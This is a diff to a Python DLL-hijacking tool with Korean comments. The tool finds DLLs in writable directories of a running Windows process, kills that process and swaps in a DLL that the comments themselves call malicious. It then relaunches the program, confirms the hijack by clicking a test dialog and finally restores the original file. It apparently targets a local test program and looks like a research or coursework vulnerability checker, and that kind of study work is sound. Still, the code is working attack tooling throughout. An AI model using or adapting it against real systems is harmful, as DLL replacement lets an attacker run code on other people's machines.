@@ -4,6 +4,8 @@ from pyinjector import inject
 import subprocess
 import psutil
 import shutil
+from pywinauto import *
+import time
 class hiJacking():
     def hiJacking(self):
         pass
@@ -44,7 +46,9 @@ class hiJacking():
                     list_programs.append(i)
                 if i.endswith(".dll"):
                     list_dlls.append(i)   
-            program_name = list_programs[0]
+            for i in list_programs:
+                if i.startswith("C:/"):
+                    program_name = i
         except:
             print("Wrong pid...")
         return program_name, list_dlls
@@ -91,15 +95,36 @@ class hiJacking():
             return subprocess.Popen([path]).pid
         
     #악성 dll을 입력받은 경로로 바꿔줌
-    def change_dll(self,dll_path,hijactable_dll_path,pid):
+    def change_dll(self,dll_path,hijactable_dll_path,program_name):
+        successed_list = []
         try:
+            tmp = os.environ['TMP']
             for i in hijactable_dll_path:
-                os.remove(i)
-                shutil.copy2(dll_path,i)
                 
-        except:
+                original_name_list = i.split('/')
+                original_name = original_name_list[-1]
+                path = tmp.replace("\\","/") + "/" + original_name
+                dir_path = os.path.dirname(i)
+                shutil.move(i,tmp)
+                shutil.copy2(dll_path,i)
+                pid = dll_hijact.create_process(program_name)
+                app = application.Application()
+                app.connect(process=pid)
+                
+                try:
+                    message = app.window(title_re="SECU") 
+                    message.OKButton.click()
+                    successed_list.append(i)
+                    psutil.Process(pid).kill()
+                except:
+                    pass
+                time.sleep(0.1)  # import time
+                os.remove(i)
+                shutil.move(path,dir_path)
+        except Exception as e:
             print("Cannot remove or write DLL")
-            
+            print(e)
+        return successed_list
     def search_order_hijack(self,pid):
         program_name, list_dlls = self.list_dll(pid)
         program_path = os.path.dirname(program_name)
@@ -153,22 +178,25 @@ class hiJacking():
         
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
-    def normal_hijack(self):
-        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
-        path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
-        pid = self.create_process(path_exe)
+    def normal_hijack(self,pid):
+        successed_list = []
         program_name, list_dlls = self.list_dll(pid)
         file_list,dir_list = self.check_permission(list_dlls)
-        if not len(file_list) == 0:
+        if not len(dir_list) == 0:
             if self.find_string(program_name,file_list,dir_list):
                 print("Detect programs vulnerable to dll injection")
+                print("Vulnerable dll Lists : ")
+                for i in dir_list:
+                    print(i)
                 print("Vulnerable PID : " + str(pid))
-                os.system('taskkill /f /pid '+str(pid))
-                self.change_dll(path_dll,dir_list,pid)
+                psutil.Process(pid).kill()
+                successed_list = self.change_dll(path_dll,dir_list,program_name)
+                
             else:
                 print("Nah....")
         else:
             print("Not Found writable dir")
+        return successed_list
 class injection():
     def injection(self):
         pass
@@ -203,9 +231,12 @@ if __name__=='__main__':
     dll_hijact = hiJacking()
     path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
     path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
-    #pid = dll_hijact.create_process(path_exe)
+    pid = dll_hijact.create_process(path_exe)
     #inject(pid,path_dll)
     #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
-    success = dll_hijact.search_order_hijack(20588)    
-    for i,j in success.items():
-        print(i,j)
+    # success = dll_hijact.search_order_hijack(20588)    
+    # for i,j in success.items():
+    #     print(i,j)
+    
+    lists = dll_hijact.normal_hijack(pid)
+    
